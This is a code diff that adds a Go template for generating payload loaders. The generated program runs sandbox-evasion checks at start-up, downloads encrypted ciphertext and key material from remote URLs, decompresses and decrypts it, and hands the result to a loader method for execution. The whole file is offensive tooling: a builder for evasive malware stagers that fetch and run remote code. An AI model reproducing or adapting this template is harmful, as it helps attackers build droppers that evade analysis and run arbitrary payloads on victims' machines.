@@ -1,0 +1,70 @@
+{{- define "Dynamic" -}}
+{{- with .Dynamic.BaseCtx -}}
+package main
+
+import (
+    {{- if .Loader}}
+    "{{.Loader.Import}}"{{- end}}
+    {{- if .Crypto}}
+    "{{.Crypto.Import}}"{{- end}}
+    {{- if .Sandbox}}
+    "{{.Sandbox.Import}}"{{- end}}
+    {{- if .Compress}}
+    "{{.Compress.Import}}"{{- end}}
+    {{- if .Remote}}
+    "{{.Remote.Import}}"{{- end}}
+)
+
+{{- if .Sandbox}}
+func init() {
+    {{- range .Sandbox.Methods}}
+    {{.}}()
+    {{- end}}
+}
+{{- end -}}
+{{end}}
+
+func main() {
+    {{- with .Dynamic -}}
+
+    {{- if .BaseCtx.Hash}}
+    {{.BaseCtx.Hash.HashVar}} := {{.BaseCtx.Hash.Function}}("{{.BaseCtx.Hash.Url}}", "")
+    {{- end}}
+
+    {{- if .BaseCtx.Hash.KeyRange}}
+    {{.KeyVar}} := {{.BaseCtx.Hash.HashVar}}{{.BaseCtx.Hash.KeyRange}}
+    {{else}}
+    {{.KeyVar}} := []byte("{{.KeyValue}}")
+    {{- end}}
+
+    {{- if .BaseCtx.Hash.IVRange}}
+    {{.IVVar}} := {{.BaseCtx.Hash.HashVar}}{{.BaseCtx.Hash.IVRange}}
+    {{else}}
+    {{.IVVar}} := []byte("{{.IVValue}}")
+    {{- end}}
+
+    {{- if .BaseCtx.Remote}}
+    {{.BaseCtx.Payload.CipherText}} := {{.BaseCtx.Remote.Function}}("{{.BaseCtx.Remote.Url}}", "")
+    {{- end}}
+
+    {{- if .BaseCtx.Compress.Ratio}}
+    {{.BaseCtx.Payload.CipherText}}, _ = {{.BaseCtx.Compress.Algorithm}}(
+        {{.BaseCtx.Payload.CipherText}},
+        {{.BaseCtx.Compress.Ratio}},
+    )
+    {{else}}
+    {{.BaseCtx.Payload.CipherText}} = {{.BaseCtx.Compress.Algorithm}}(
+            {{.BaseCtx.Payload.CipherText}},
+        )
+    {{- end}}
+
+    {{.BaseCtx.Payload.PlainText}}, _ := {{.BaseCtx.Crypto.Decrypt}}(
+        {{.BaseCtx.Payload.CipherText}},
+        {{if .KeyVar}}{{.KeyVar}}{{else}}nil{{end}},
+        {{if .IVVar}}{{.IVVar}}{{else}}nil{{end}},
+    )
+
+    {{.BaseCtx.Loader.Method}}({{.BaseCtx.Payload.PlainText}})
+    {{- end -}}
+}
+{{- end -}}
